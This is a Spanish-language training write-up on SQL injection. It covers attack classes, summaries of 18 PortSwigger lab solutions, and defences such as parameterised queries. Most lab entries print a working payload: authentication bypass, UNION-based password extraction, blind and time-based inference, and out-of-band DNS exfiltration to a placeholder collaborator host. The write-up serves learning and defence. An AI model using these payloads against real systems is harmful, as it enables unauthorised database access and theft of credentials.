Introducción y Fundamentos

SQL Injection (SQLi) es una de las vulnerabilidades más críticas e históricas en el ámbito de la seguridad de aplicaciones web. Ocurre cuando una aplicación web inserta directamente entradas de usuario no sanitizadas dentro de una consulta SQL estructurada, permitiendo que el motor de base de datos interprete los datos del usuario como comandos ejecutables.

El impacto de SQL Injection compromete de forma directa los tres pilares de la seguridad informática (CIA):

Confidencialidad

Permite a atacantes exfiltrar información sensible de la base de datos, como credenciales de usuarios, contraseñas hash, información financiera o propiedad intelectual.

Integridad

Permite la modificación no autorizada de registros, alteración de lógica de autenticación o la destrucción total del sistema de archivos de base de datos mediante borrado de tablas.

Disponibilidad

Un atacante puede colapsar el sistema web inyectando funciones dinámicas pesadas (ataques basados en tiempo) o comandos destructivos de apagado del servidor.

Clasificación General de Ataques SQLi

Los ataques de inyección SQL se clasifican técnicamente bajo tres grandes vectores:

  • 1. In-band (Classic SQLi): El atacante utiliza el mismo canal de comunicación para inyectar la carga útil y ver el resultado (ej. *Union-based* o *Error-based*).
  • 2. Blind (Ciega): La aplicación no muestra mensajes de error ni datos de salida en la respuesta HTTP. El atacante debe inferir información realizando preguntas lógicas verdaderas/falsas (*Boolean-based*) o midiendo retrasos de tiempo inducidos en las consultas (*Time-based*).
  • 3. Out-of-band: La exfiltración se realiza mediante un canal alterno controlado por el atacante (como consultas DNS o HTTP asíncronas detonadas por la base de datos).

Bitácora Técnica Interactiva de Laboratorios (18 Labs)

A continuación se expone el panel interactivo que resume los 18 laboratorios desarrollados en la **Web Security Academy de PortSwigger**. Utiliza la barra de filtros rápidos para segmentar la bitácora según su nivel de severidad:

Filtros:

Laboratorio 01

Apprentice
SQLi in WHERE clause (hidden data)
Objetivo: Explotar el parámetro de filtrado de categoría para mostrar productos no publicados.
Explicación: Falta de validación que permite inyectar operadores lógicos para hacer que la consulta original WHERE evalúe como VERDADERA.
?category=Gifts' OR 1=1--
Lab Solved

Laboratorio 02

Apprentice
Login Bypass
Objetivo: Acceder a la cuenta de "administrator" en el formulario de login sin conocer la clave.
Explicación: Inyección en el parámetro de entrada de usuario para anular y comentar la lógica de verificación de la contraseña.
username: administrator'-- & password: any
Lab Solved

Laboratorio 03

Practitioner
Querying Version on Oracle
Objetivo: Utilizar UNION para consultar el tipo de base de datos y su versión en Oracle.
Explicación: Se requiere determinar el número de columnas (2) y rellenar la consulta inyectando la tabla del sistema de Oracle `v$version`.
?category=Gifts' UNION SELECT banner, NULL FROM v$version--
Lab Solved

Laboratorio 04

Practitioner
Querying Version on MySQL/MSSQL
Objetivo: Obtener la versión de la base de datos en entornos MySQL o Microsoft SQL Server.
Explicación: Inyección Union-Based determinando las dos columnas e inyectando la variable del sistema de MySQL `@@version`.
?category=Pets' UNION SELECT NULL, @@version--
Lab Solved

Laboratorio 05

Practitioner
Listing Database Contents (non-Oracle)
Objetivo: Enumerar tablas, encontrar la tabla de usuarios, sus columnas y extraer la clave de administrador.
Explicación: Mapeo dinámico e inyección sobre tablas del sistema `information_schema.tables` y `information_schema.columns`.
?category=Gifts' UNION SELECT username_utpasc, password_spjiov FROM users_xpjxxo--
Lab Solved

Laboratorio 06

Practitioner
Listing Database Contents on Oracle
Objetivo: Enumerar y exfiltrar usuarios y contraseñas desde una base de datos Oracle afectada.
Explicación: Equivalente al Lab 5 pero interactuando con la tabla del sistema `all_tables` y `all_tab_columns` propias de Oracle.
?category=Gifts' UNION SELECT username_column, password_column FROM users_table--
Lab Solved

Laboratorio 07

Practitioner
UNION: Determining Column Count
Objetivo: Identificar cuántas columnas regresa la consulta inyectando diferentes valores NULL.
Explicación: La consulta inyectada con UNION SELECT debe poseer el número exacto de columnas que la query original o dará error 500.
?category=Gifts' UNION SELECT NULL, NULL, NULL--
Lab Solved

Laboratorio 08

Practitioner
UNION: Finding Column with Text
Objetivo: Encontrar cuál de las columnas devueltas por la consulta permite albergar texto.
Explicación: Tras definir el número de columnas (3), se reemplaza cada NULL individualmente con una cadena de prueba.
?category=Gifts' UNION SELECT NULL, 'abcdef', NULL--
Lab Solved

Laboratorio 09

Practitioner
UNION: Retrieving Data from Tables
Objetivo: Exfiltrar las contraseñas de la tabla de usuarios utilizando la técnica UNION.
Explicación: Explotación Union-Based dirigida hacia la tabla `users` tras identificar que cuenta con dos columnas que aceptan texto.
?category=Gifts' UNION SELECT username, password FROM users--
Lab Solved

Laboratorio 10

Practitioner
UNION: Multiple Values in Single Column
Objetivo: Extraer nombres y claves cuando la consulta original solo expone una única columna utilizable.
Explicación: Concatenación de campos usando operadores específicos de cadenas (como `||` en Oracle o `CONCAT` en MySQL).
?category=Gifts' UNION SELECT NULL, username || '~' || password FROM users--
Lab Solved

Laboratorio 11

Practitioner
Blind SQLi with Conditional Responses
Objetivo: Obtener la contraseña de administrador infiriendo cada carácter mediante respuestas condicionales.
Explicación: Inyección sobre cookie de rastreo. La aparición del texto "Welcome back!" confirma si la subconsulta booleana inyectada fue verdadera.
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
Lab Solved

Laboratorio 12

Practitioner
Blind SQLi with Conditional Errors
Objetivo: Extraer la contraseña induciendo errores controlados en bases de datos que no varían su respuesta.
Explicación: Se inyecta una condición que genera división por cero o error de sintaxis nativa (ej. `CASE WHEN`) si la letra evaluada es correcta.
TrackingId=xyz' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Lab Solved

Laboratorio 13

Practitioner
Visible Error-Based SQLi
Objetivo: Extraer datos sensibles directamente forzando a que la base de datos los muestre en el mensaje de error.
Explicación: Uso de funciones de conversión o XML del motor para causar fallos de conversión de datos que expongan la variable.
TrackingId=xyz' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
Lab Solved

Laboratorio 14

Practitioner
Blind SQLi with Time Delays
Objetivo: Confirmar la inyección forzando al motor a pausar su respuesta durante 10 segundos.
Explicación: Uso de funciones durmientes en consultas ciegas como `pg_sleep()` en PostgreSQL o `sleep()` en MySQL.
TrackingId=xyz'||pg_sleep(10)--
Lab Solved

Laboratorio 15

Practitioner
Blind SQLi with Time Delays & Info Retrieval
Objetivo: Extraer caracteres condicionalmente utilizando pausas de tiempo controladas.
Explicación: Se combina una pregunta binaria con un retardo temporal. Si el primer carácter es correcto, se dispara un retardo de 10s.
TrackingId=xyz'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
Lab Solved

Laboratorio 16

Practitioner
Blind SQLi with Out-Of-Band Interaction
Objetivo: Detonar una interacción DNS con un servidor externo para comprobar el fallo.
Explicación: Uso de funciones de búsqueda externa como `extractvalue` o peticiones DNS nativas sobre dominios controlados por Burp Collaborator.
TrackingId=xyz'+UNION+SELECT+extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://collaborator-link"> %remote;]>'),'/l')--
Lab Solved

Laboratorio 17

Practitioner
Blind SQLi with Out-Of-Band & Info Retrieval
Objetivo: Exfiltrar la contraseña del administrador enviando el valor codificado dentro de un subdominio DNS.
Explicación: Redirección y exfiltración DNS asíncrona concatenando la variable de contraseña en la consulta DNS externa.
TrackingId=xyz' UNION SELECT extractvalue(xmltype('<?xml... SYSTEM "http://' || password || '.collaborator-link">...'),'/l')--
Lab Solved

Laboratorio 18

Practitioner
Filter Bypass via XML Encoding
Objetivo: Explotar inyección SQL en formularios web que filtran peticiones comunes, evadiendo la firma del WAF.
Explicación: Codificación del payload mediante entidades numéricas hexadecimales en XML (XML Entity Encoding) que la base de datos decodifica automáticamente.
<stockCheck><productId>1</productId><storeId>1 UNION SELECT username || '~' || password FROM users</storeId></stockCheck>
Lab Solved

Principios de Defensa y Mitigación Definitiva

La mitigación de SQL Injection es conceptualmente simple pero exige consistencia y disciplina en el ciclo de vida de desarrollo seguro (S-SDLC):

  • Consultas Parametrizadas (Sentencias Preparadas): La defensa número uno. Separan estrictamente la estructura del comando SQL de los datos ingresados por el usuario. La base de datos trata el payload estrictamente como un literal de texto y nunca como código ejecutable.
  • Validación Estricta de Entradas (Listas Blancas): Filtrado exhaustivo a nivel de tipo de datos, longitud y formato esperado antes de enviar cualquier información a la query.
  • Principio de Mínimo Privilegio: Configurar las cuentas de acceso del servicio web a la base de datos con permisos estrictamente acotados (lectura/escritura en tablas necesarias), previniendo consultas cruzadas a tablas del sistema.
  • Manejo Seguro de Errores: Deshabilitar mensajes de error detallados en producción para evitar fugas de información útiles para ataques *Error-based*.
